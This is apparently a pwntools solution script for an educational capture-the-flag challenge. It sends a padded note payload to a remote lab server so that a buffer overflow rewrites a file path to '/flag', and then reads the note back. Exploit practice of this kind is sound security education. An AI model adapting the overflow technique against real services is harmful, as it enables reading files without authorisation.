from pwn import *

#r = process('./chal/chal')
r = remote('edu-ctf.zoolab.org','10019')
def write_note(data):
    r.sendlineafter(b'Exit\n',b'1')
    r.sendlineafter(b'Content:\n',data)

def read_note():
    r.sendlineafter(b'Exit\n',b'2')

payload = b'a' * 0x75 + b'/flag\x00'
write_note(payload)
read_note()
r.interactive() 